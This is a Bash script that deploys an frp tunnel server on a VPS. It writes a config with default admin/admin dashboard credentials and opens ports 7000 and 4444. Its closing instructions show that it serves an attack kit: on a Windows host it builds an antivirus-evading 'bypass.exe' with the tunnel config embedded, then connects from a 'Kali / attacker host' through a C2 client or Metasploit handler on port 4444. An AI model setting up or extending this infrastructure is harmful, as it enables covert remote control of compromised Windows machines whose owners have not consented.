#!/bin/bash
# ================================================================
# VPS FRP Server (frps) 一键部署脚本
# Ubuntu/Debian / CentOS 通用
# ================================================================
# 用法:
#   chmod +x setup_vps.sh && sudo ./setup_vps.sh
# ================================================================
set -e

FRP_VERSION="0.61.0"
FRP_DIR="/opt/frp"
SERVICE_FILE="/etc/systemd/system/frps.service"

echo "[*] Installing frps v${FRP_VERSION} ..."

# Detect architecture
ARCH=$(uname -m)
case "$ARCH" in
    x86_64)  FRP_ARCH="amd64" ;;
    aarch64) FRP_ARCH="arm64" ;;
    *)       echo "[!] Unsupported arch: $ARCH"; exit 1 ;;
esac

# Download frp
if [ ! -f "${FRP_DIR}/frps" ]; then
    mkdir -p "${FRP_DIR}"
    cd /tmp
    wget -q "https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/frp_${FRP_VERSION}_linux_${FRP_ARCH}.tar.gz"
    tar xzf "frp_${FRP_VERSION}_linux_${FRP_ARCH}.tar.gz"
    cp "frp_${FRP_VERSION}_linux_${FRP_ARCH}/frps" "${FRP_DIR}/"
    cp "frp_${FRP_VERSION}_linux_${FRP_ARCH}/frps.toml" "${FRP_DIR}/"
    rm -rf "frp_${FRP_VERSION}_linux_${FRP_ARCH}"*
    echo "[+] frps downloaded to ${FRP_DIR}"
fi

# Write frps config (minimal)
cat > "${FRP_DIR}/frps.toml" << 'FRPS_CFG'
bindPort = 7000

# Token authentication (CHANGE THIS in production!)
auth.token = "bypass_token_change_me"

# Dashboard (optional, for monitoring)
webServer.addr = "127.0.0.1"
webServer.port = 7500
webServer.user = "admin"
webServer.password = "admin"
FRPS_CFG

echo "[+] Config written to ${FRP_DIR}/frps.toml"
echo "    IMPORTANT: Edit auth.token in frps.toml!"

# Install hardened systemd unit (preferred over the inline heredoc).
# frps.service is shipped in the project next to this script and uses
# CapabilityBoundingSet= / ProtectSystem= / RestrictAddressFamilies=
# to minimize the attack surface of an exposed bind-port service.
cp "$(dirname "$0")/frps.service" "${SERVICE_FILE}"
cp "$(dirname "$0")/frps.toml.example" "${FRP_DIR}/frps.toml.example"

systemctl daemon-reload
systemctl enable frps
systemctl start frps

# Open firewall ports if ufw is in use
if command -v ufw >/dev/null 2>&1; then
    ufw allow 7000/tcp  >/dev/null || true
    ufw allow 4444/tcp  >/dev/null || true
fi

echo ""
echo "[+] frps installed and running!"
echo "    Status:   systemctl status frps"
echo "    Config:   ${FRP_DIR}/frps.toml"
echo "    Logs:     sudo journalctl -u frps -f"
echo ""
echo "[*] Next steps:"
echo "    1. Edit ${FRP_DIR}/frps.toml → set auth.token"
echo "    2. systemctl restart frps"
echo "    3. On the Windows host, run:"
echo "         cd bypass_av"
echo "         build.bat frp <YOUR_VPS_IP>     # rebuilds bypass.exe embedded with FRP config"
echo "    4. From Kali / attacker host:"
echo "         python3 tools/c2client.py <YOUR_VPS_IP> 4444"
echo "         # or use msfconsole + exploit/multi/handler pointing at the same IP:port"
